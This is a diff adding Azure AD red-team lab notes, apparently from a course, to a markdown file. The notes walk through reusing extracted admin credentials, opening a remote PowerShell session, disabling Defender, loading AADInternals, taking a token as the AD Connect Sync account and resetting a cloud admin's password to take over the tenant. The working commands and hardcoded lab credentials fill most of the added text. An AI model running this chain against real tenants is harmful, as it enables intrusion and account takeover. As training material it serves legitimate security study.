@@ -1488,6 +1488,56 @@ AD Connect vs CloudSync??
 
 The "Cloud anchor" is ```User_``` followed by the objectId e.g., =
 
+- Recall that we extracted credentials for ```defeng-adcnct\administrator``` from PowerShell history of a user from the bkpadconnect VM.
+- We also compromised defeng-adcsrv by abusing the automation account 'Hybridautomation'.
+
+Use the credentials extracted from bkpadconnect on the defeng-adcnct server. Assuming that we know the IP and the server is directly reachable from the student VM:
+```
+$password = ConvertTo-SecureString 'CredsToManageCl0udSync!' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('administrator', $password) 
+$adcnct = New-PSSession -ComputerName 172.16.1.21 -Credential $creds 
+Enter-PSSession $adcnct
+```
+
+Check if Azure AD connect is installed on defeng-adcnct. 
+Below command is from the AzureADConnectHealthSync module that is installed by default on installation of Azure AD Connect: 
+```
+Get-ADSyncConnector
+```
+
+Let's load the AADInternals module in the PSRemtoing session and extract credentials for the ```Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com``` that can then be used to reset password for any user in the cloud: 
+```
+Set-MpPreference -DisableRealtimeMonitoring $true 
+exit
+...
+Copy-Item -ToSession $adcnct -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents 
+Enter-PSSession $adcnct
+Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals 
+Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
+```
+
+Use the credentials of the Sync_* account to request an access token for AADGraph API and save it to cache:
+```
+$passwd = ConvertTo-SecureString 'password' -AsPlainText -Force 
+$creds = New-Object System.Management.Automation.PSCredential ("Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", $passwd) 
+Get-AADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache
+```
+
+Get the ImmutableId for the onpremadmin user:
+```
+Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
+```
+
+Reset the onpremadmin user's password using the below command:
+```
+Set-AADIntUserPassword -SourceAnchor "E2gG19HA4EaDe0+3LkcS5g==" -Password "SuperSecretpass#12321" –Verbose
+```
+
+Finally, use the onpremadmin user's credentials to access the defcorpsecure tenant from the student VM!
+
+
+
+
 ## Passthry
 ## ADFS
 
